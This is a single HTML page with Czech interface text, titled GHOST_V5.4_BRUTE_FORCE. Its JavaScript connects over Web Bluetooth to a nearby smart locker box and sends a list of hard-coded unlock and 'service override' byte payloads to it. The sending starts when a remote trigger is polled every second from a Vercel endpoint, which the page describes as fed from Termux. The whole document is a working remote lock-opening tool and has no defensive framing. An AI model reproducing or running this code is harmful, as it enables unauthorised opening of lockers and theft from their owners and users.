<!DOCTYPE html>
<html>
<head>
    <title>GHOST_V5.4_BRUTE_FORCE</title>
    <style>
        body { background: black; color: #00FF00; font-family: monospace; padding: 20px; }
        .log { border: 1px solid #00FF00; padding: 10px; height: 300px; overflow-y: auto; background: #050505; }
        .status-ready { color: #00FF00; font-weight: bold; }
        .status-active { color: #0088FF; font-weight: bold; }
        .btn-main { background: #00FF00; color: black; border: none; padding: 15px; width: 100%; font-weight: bold; margin-top: 10px; }
    </style>
</head>
<body>
    <h2>GHOST_V5.4_BRUTE_FORCE</h2>
    <div id="status" class="status-ready">STATUS: SYSTÉM PŘIPRAVEN</div>
    <div id="log" class="log"></div>
    <button class="btn-main" onclick="connectAndListen()">[1] AKTIVOVAT HLOUBKOVOU ANALÝZU & CLOUD SYNC</button>

    <script>
        let device = null;
        let characteristic = null;
        const VERCEL_URL = "https://smart-locker-security-audit.vercel.app/api/bridge?deviceId=3c400ea8e35724d5";

        // Databáze útočných kódů (Payloads) pro různé typy boxů
        const ATTACK_DATABASE = [
            [0x55, 0x01, 0x01, 0x00, 0x00, 0x00, 0x01, 0x58], // Standard Unlock
            [0x55, 0x07, 0x01, 0x01, 0x01, 0x01, 0x01, 0x5C], // Service Override
            [0x05, 0x01, 0x06, 0x30, 0x30, 0x30, 0x30, 0x30], // Legacy Protocol
            [0x55, 0x02, 0x01, 0x00, 0x01, 0x00, 0x01, 0x5A], // Alternate Pulse
            [0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]  // Reset Command
        ];

        function log(msg) {
            const l = document.getElementById('log');
            l.innerHTML += `> ${msg}<br>`;
            l.scrollTop = l.scrollHeight;
        }

        async function connectAndListen() {
            try {
                log("Hledám box v okolí...");
                device = await navigator.bluetooth.requestDevice({
                    acceptAllDevices: true,
                    optionalServices: ['0000fee7-0000-1000-8000-00805f9b34fb']
                });
                
                const server = await device.gatt.connect();
                log("PŘIPOJENO K BOXU. Vyhledávám kanál...");
                
                const service = await server.getPrimaryService('0000fee7-0000-1000-8000-00805f9b34fb');
                const chars = await service.getCharacteristics();
                characteristic = chars[0];

                document.getElementById('status').innerText = "STATUS: CLOUD-LISTENER AKTIVNÍ";
                document.getElementById('status').className = "status-active";
                log("LISTENER AKTIVNÍ: ČEKÁM NA SIGNÁL Z TERMUXU...");

                // Nekonečná smyčka - kontrola signálu z Vercelu každou vteřinu
                setInterval(checkCloudTrigger, 1000);

            } catch (e) {
                log("CHYBA: " + e);
            }
        }

        async function checkCloudTrigger() {
            try {
                const response = await fetch(VERCEL_URL);
                const data = await response.json();

                if (data.action === "trigger_ble_unlock") {
                    log("!!! SIGNÁL Z TERMUXU PŘIJAT !!!");
                    await startBruteForceAttack();
                    // Vymazání signálu po akci
                    await fetch(VERCEL_URL, { method: 'POST', body: JSON.stringify({action: "clear"}) });
                }
            } catch (e) {}
        }

        async function startBruteForceAttack() {
            log("STARTUJI BRUTE-FORCE SEKVENCI...");
            for (let i = 0; i < ATTACK_DATABASE.length; i++) {
                try {
                    const payload = new Uint8Array(ATTACK_DATABASE[i]);
                    log(`INJEKCE PAYLOADU #${i+1}...`);
                    await characteristic.writeValue(payload);
                    log(`PAYLOAD #${i+1} -> POSLÁN [OK]`);
                    // Krátká pauza mezi výstřely
                    await new Promise(r => setTimeout(r, 200)); 
                } catch (e) {
                    log(`CHYBA U PAYLOADU #${i+1}: ` + e);
                }
            }
            log("ÚTOK DOKONČEN. ZKONTROLUJ ZÁMEK.");
        }
    </script>
</body>
</html>
